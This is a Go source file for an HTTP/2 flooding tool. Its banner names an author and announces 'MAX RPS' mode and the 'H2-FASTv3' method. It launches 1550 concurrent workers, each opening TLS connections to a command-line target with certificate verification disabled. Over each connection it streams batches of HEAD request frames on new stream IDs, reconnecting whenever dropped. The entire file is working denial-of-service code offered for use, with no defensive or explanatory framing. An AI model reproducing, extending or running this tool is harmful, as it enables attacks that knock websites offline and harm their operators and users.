package main

import (
 "bytes"
 "context"
 "crypto/tls"
 "encoding/binary"
 "fmt"
 "net"
 "os"
 "os/signal"
 "runtime"
 "sync"
 "sync/atomic"
 "syscall"
 "time"
)

type Config struct {
 Workers int
 BatchSize int
 MaxStreamID uint32
 DialTimeout time.Duration
}

var config = Config{
 Workers: 1550,
 BatchSize: 50,
 MaxStreamID: 1000000,
 DialTimeout: 2 * time.Second,
}

var bufferPool = sync.Pool{
 New: func() interface{} {
 return &bytes.Buffer{}
 },
}

func Buffer_Informasi() *bytes.Buffer {
 buf := bufferPool.Get().(*bytes.Buffer)
 buf.Reset()
 return buf
}

func Buffer_Sprint(buf *bytes.Buffer) {
 if buf.Cap() > 256*1024 {
 return
 }
 bufferPool.Put(buf)}

var Baca_Buffer_Polling = sync.Pool{
 New: func() interface{} {
 b := make([]byte, 65536)
 return &b
},}

type H2_FRAME struct {
 Length uint32
 Type byte
 Flags byte
 Stream uint32
 Payload []byte
}

func Cetak_H2_FRAME(frame *H2_FRAME, buf *bytes.Buffer) {
 var tmp [9]byte
 binary.BigEndian.PutUint32(tmp[0:4], (frame.Length<<8)|uint32(frame.Type))
 tmp[4] = frame.Flags
 binary.BigEndian.PutUint32(tmp[5:9], frame.Stream)
 buf.Write(tmp[:])
 if len(frame.Payload) > 0 {
 buf.Write(frame.Payload)
 }
}

type Hpack_Encoder struct {
 static [][2]string
}

func Hpack_Encoder_Baru() *Hpack_Encoder {
 return &Hpack_Encoder{
 static: [][2]string{
  {":authority", ""},
  {":method", "GET"},
  {":method", "POST"},
  {":path", "/"},
  {":path", "/index.html"},
  {":scheme", "http"},
  {":scheme", "https"},
  {":status", "200"},
  {":status", "204"},
  {":status", "206"},
  {":status", "304"},
  {":status", "400"},
  {":status", "404"},
  {":status", "500"},
  {"accept-charset", ""},
  {"accept-encoding", "gzip, deflate"},
  {"accept-language", ""},
  {"accept-ranges", ""},
  {"accept", ""},
  {"access-control-allow-origin", ""},
  {"age", ""},
  {"allow", ""},
  {"authorization", ""},
  {"cache-control", ""},
  {"content-disposition", ""},
  {"content-encoding", ""},
  {"content-language", ""},
  {"content-length", ""},
  {"content-location", ""},
  {"content-range", ""},
  {"content-type", ""},
  {"cookie", ""},
  {"date", ""},
  {"etag", ""},
  {"expect", ""},
  {"expires", ""},
  {"from", ""},
  {"host", ""},
  {"if-match", ""},
  {"if-modified-since", ""},
  {"if-none-match", ""},
  {"if-range", ""},
  {"if-unmodified-since", ""},
  {"last-modified", ""},
  {"link", ""},
  {"location", ""},
  {"max-forwards", ""},
  {"proxy-authenticate", ""},
  {"proxy-authorization", ""},
  {"range", ""},
  {"referer", ""},
  {"refresh", ""},
  {"retry-after", ""},
  {"server", ""},
  {"set-cookie", ""},
  {"strict-transport-security", ""},
  {"transfer-encoding", ""},
  {"user-agent", ""},
  {"vary", ""},
  {"via", ""},
  {"www-authenticate", ""},
 },
 }
}

func (e *Hpack_Encoder) findStaticIndex(name, value string) int {
 for i, entry := range e.static {
 if entry[0] == name && (value == "" || entry[1] == value) {
  return i + 1
 }
 }
 return 0
}

func (e *Hpack_Encoder) encodeString(s string, buf *bytes.Buffer) {
 length := len(s)
 if length < 128 {
 buf.WriteByte(byte(length))
 } else {
 buf.WriteByte(byte(0x80 | (length & 0x7F)))
 length >>= 7
 for length > 0 {
  b := byte(length & 0x7F)
  length >>= 7
  if length > 0 {
  b |= 0x80
  }
  buf.WriteByte(b)
 }
 }
 buf.WriteString(s)
}

func (e *Hpack_Encoder) EncodeHeaders(headers map[string]string, buf *bytes.Buffer) {
 for name, value := range headers {
 idx := e.findStaticIndex(name, value)
 if idx > 0 {
  if value == "" {
  buf.WriteByte(0x80 | byte(idx))
  } else {
  buf.WriteByte(0x40 | byte(idx))
  e.encodeString(value, buf)
  }
 } else {
  buf.WriteByte(0x00)
  e.encodeString(name, buf)
  e.encodeString(value, buf)
 }
 }
}

func FireFox_Tls(host string) *tls.Config {
 return &tls.Config{
 InsecureSkipVerify: true,
 ServerName:  host,
 MinVersion:  tls.VersionTLS12,
 MaxVersion:  tls.VersionTLS13,
 CipherSuites: []uint16{
  tls.TLS_AES_128_GCM_SHA256,
  tls.TLS_AES_256_GCM_SHA384,
  tls.TLS_CHACHA20_POLY1305_SHA256,
  tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
  tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 },
 CurvePreferences: []tls.CurveID{
  tls.X25519,
  tls.CurveP256,
 },
 NextProtos: []string{"h2"},
 }
}

var (
 preface = []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
 settingsFrm = []byte{0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00}
 settingsAck = []byte{0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00}
)

type Conn struct {
 tlsConn *tls.Conn
 host  string
 path  string
 encoder *Hpack_Encoder
 writeMu sync.Mutex
 streamID uint32
 closed int32
 hpackPayload []byte
}

func (c *Conn) nextStreamID() uint32 {
 for {
 current := atomic.LoadUint32(&c.streamID)
 var next uint32
 if current == 0 {
  next = 1
 } else {
  next = current + 2
  if next > config.MaxStreamID {
  next = 1
  }
 }
 if atomic.CompareAndSwapUint32(&c.streamID, current, next) {
  return next
 }
 }
}

func (c *Conn) isClosed() bool {
 return atomic.LoadInt32(&c.closed) == 1
}

func (c *Conn) setClosed() {
 atomic.StoreInt32(&c.closed, 1)
}

func (c *Conn) close() {
 c.setClosed()
 c.tlsConn.Close()
}

func (c *Conn) sendBatch(Ukuran_Batch int) error {
 if c.isClosed() {
 return fmt.Errorf("closed")
 }

 c.writeMu.Lock()
 defer c.writeMu.Unlock()

 batchBuf := Buffer_Informasi()
 defer Buffer_Sprint(batchBuf)

 for i := 0; i < Ukuran_Batch; i++ {
 streamID := c.nextStreamID()
 Cetak_H2_FRAME(&H2_FRAME{
  Length: uint32(len(c.hpackPayload)),
  Type: 0x01,
  Flags: 0x05,
  Stream: streamID,
  Payload: c.hpackPayload,
 }, batchBuf)
 }

 _, err := c.tlsConn.Write(batchBuf.Bytes())
 if err != nil {
 c.close()
 return err
 }

 return nil
}

func (c *Conn) asyncDrain(ctx context.Context) {
 bufPtr := Baca_Buffer_Polling.Get().(*[]byte)
 buf := *bufPtr
 defer Baca_Buffer_Polling.Put(bufPtr)

 for ctx.Err() == nil && !c.isClosed() {
 c.tlsConn.SetReadDeadline(time.Now().Add(5 * time.Second))
 n, err := c.tlsConn.Read(buf[:9])
 if err != nil {
  if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
  c.close()
  }
  return
 }
 if n < 9 {
  continue
 }

 length := binary.BigEndian.Uint32(buf[0:4]) >> 8
 Type_Frame := buf[3]
 flags := buf[4]

 if length > 0 {
  readLen := length
  if readLen > 65527 {
  readLen = 65527
  }
  c.tlsConn.Read(buf[9 : 9+readLen])

  if length > readLen {
  remaining := length - readLen
  discard := make([]byte, 4096)
  for remaining > 0 {
   rn, _ := c.tlsConn.Read(discard)
   if rn == 0 {
   break
   }
   remaining -= uint32(rn)
  }
  }
 }

 switch Type_Frame {
 case 0x04:
  if flags&0x01 == 0 {
  c.writeMu.Lock()
  c.tlsConn.Write(settingsAck)
  c.writeMu.Unlock()
  }
 case 0x06:
  if flags&0x01 == 0 {
  c.writeMu.Lock()
  var pingAck [17]byte
  binary.BigEndian.PutUint32(pingAck[0:4], 8<<8|uint32(0x06))
  pingAck[4] = 0x01
  copy(pingAck[9:17], buf[9:17])
  c.tlsConn.Write(pingAck[:])
  c.writeMu.Unlock()
  }
 case 0x07:
  c.close()
  return
 }
 }
}

func Connection_Config(host, port, path string) (*Conn, error) {
 raw, err := net.DialTimeout("tcp", host+":"+port, config.DialTimeout)
 if err != nil {
 return nil, err
 }

 if tcpConn, ok := raw.(*net.TCPConn); ok {
 tcpConn.SetNoDelay(true)
 tcpConn.SetWriteBuffer(256 * 1024)
 }

 tlsConfig := FireFox_Tls(host)
 tlsConn := tls.Client(raw, tlsConfig)

 if err := tlsConn.Handshake(); err != nil {
 tlsConn.Close()
 return nil, err
 }

 state := tlsConn.ConnectionState()
 if state.NegotiatedProtocol != "h2" {
 tlsConn.Close()
 return nil, fmt.Errorf("ALPN not h2: %s", state.NegotiatedProtocol)
 }

 if _, err := tlsConn.Write(preface); err != nil {
 tlsConn.Close()
 return nil, err
 }
 if _, err := tlsConn.Write(settingsFrm); err != nil {
 tlsConn.Close()
 return nil, err
 }

 tlsConn.SetReadDeadline(time.Now().Add(5 * time.Second))
 var header [9]byte
 if _, err := tlsConn.Read(header[:]); err != nil {
 tlsConn.Close()
 return nil, err
 }

 length := binary.BigEndian.Uint32(header[0:4]) >> 8
 Type_Frame := header[3]

 if Type_Frame != 0x04 {
 tlsConn.Close()
 return nil, fmt.Errorf("expected SETTINGS, got type %d", Type_Frame)
 }

 if length > 0 {
 payload := make([]byte, length)
 if _, err := tlsConn.Read(payload); err != nil {
  tlsConn.Close()
  return nil, err
 }
 }

 if _, err := tlsConn.Write(settingsAck); err != nil {
 tlsConn.Close()
 return nil, err
 }

 tlsConn.SetReadDeadline(time.Time{})

 encoder := Hpack_Encoder_Baru()
 headers := map[string]string{
 ":method": "HEAD",
 ":path": path,
 ":scheme": "https",
 ":authority": host,
 "user-agent": "curl/8.4.0",
 }

 payloadBuf := Buffer_Informasi()
 encoder.EncodeHeaders(headers, payloadBuf)
 hpackPayload := make([]byte, payloadBuf.Len())
 copy(hpackPayload, payloadBuf.Bytes())
 Buffer_Sprint(payloadBuf)

 return &Conn{
 tlsConn: tlsConn,
 host:  host,
 path:  path,
 encoder: encoder,
 streamID: 0,
 hpackPayload: hpackPayload,
 }, nil
}

func Main_Worker(host, port, path string, ctx context.Context, wg *sync.WaitGroup, drainWg *sync.WaitGroup) {
 defer wg.Done()

 for ctx.Err() == nil {
 conn, err := Connection_Config(host, port, path)
 if err != nil {
  runtime.Gosched()
  continue
 }

 drainWg.Add(1)
 go func(c *Conn) {
  defer drainWg.Done()
  c.asyncDrain(ctx)
 }(conn)

 for ctx.Err() == nil && !conn.isClosed() {
  if err := conn.sendBatch(config.BatchSize); err != nil {
  break
  }
 }

 conn.close()
 }
}

func main() {
 runtime.GOMAXPROCS(runtime.NumCPU())
 My_Logo()

 if len(os.Args) < 2 {
 fmt.Print("Tutorial : go run file.go <target>\n")
 os.Exit(1)}
 host, port, path := Parsing_Link(os.Args[1])
 ctx, cancel := context.WithCancel(context.Background())
 sigChan := make(chan os.Signal, 1)
 signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

 var wg sync.WaitGroup
 var drainWg sync.WaitGroup

 for i := 0; i < config.Workers; i++ {
 wg.Add(1)
 go Main_Worker(host, port, path, ctx, &wg, &drainWg)
 }
 <-sigChan
 cancel()
 wg.Wait()
 drainWg.Wait()
}

func Parsing_Link(rawURL string) (host, port, path string) {
 if len(rawURL) > 8 && rawURL[:8] == "https://" {
 rawURL = rawURL[8:]
 }
 slashIdx := -1
 for i, c := range rawURL {
 if c == '/' {
  slashIdx = i
  break
 }
 }
 if slashIdx == -1 {
 host = rawURL
 path = "/"
 } else {
 host = rawURL[:slashIdx]
 path = rawURL[slashIdx:]
 }
 port = "443"
 if idx := Strings_Indexs(host, ':'); idx != -1 {
 port = host[idx+1:]
 host = host[:idx]
 }
 return
}

func Strings_Indexs(s string, c byte) int {
 for i := 0; i < len(s); i++ {
 if s[i] == c {
  return i
 }
 }
 return -1
}

func My_Logo() {
    fmt.Print("\x1b[97m\n\n:::::::-.  :::::::::      .,~:::::    .:::.\n")
    fmt.Print("\x1b[38;5;218m ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.\n")
    fmt.Print("\x1b[38;5;204m `[[     [[    .n[['    [[[          ''  ,['\n")
    fmt.Print("\x1b[38;5;203m  $$,    $$  ,$$P\" cccc $$$          .c$$P'\n")
    fmt.Print("\x1b[31m  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,\n")
    fmt.Print("\x1b[91m  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^\n")
    fmt.Print("\x1b[0m\x1b[31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n")
    fmt.Print("\x1b[32m〇\x1b[0m \x1b[37mAuthor\x1b[0m \x1b[31m:\x1b[0m \x1b[37mDiz Flyze Ofc\x1b[0m\n")
    fmt.Print("\x1b[32m〇\x1b[0m \x1b[37mMode  \x1b[0m \x1b[31m:\x1b[0m \x1b[37mMAX RPS\n")
    fmt.Print("\x1b[32m〇\x1b[0m \x1b[37mMethod\x1b[0m \x1b[31m:\x1b[0m \x1b[37mH2-FASTv3\n")
    fmt.Print("\x1b[32m〇\x1b[0m \x1b[37mUlimit\x1b[0m \x1b[31m:\x1b[0m \x1b[37m1048576\n")
    fmt.Print("\x1b[31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\n")
}
